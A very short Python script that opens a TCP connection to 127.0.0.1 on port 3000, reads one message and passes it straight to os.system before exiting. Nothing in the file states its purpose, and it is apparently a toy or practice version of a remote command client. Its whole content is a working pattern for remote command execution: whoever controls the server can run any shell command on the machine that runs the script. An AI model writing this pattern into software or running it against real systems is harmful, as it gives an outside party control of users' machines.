import socket

import os

s = socket.socket()
host = "127.0.0.1"
port = 3000
s.connect((host, port))

message = s.recv(2048).decode("utf-8")
print(message)
os.system(message)

s.close()
quit()
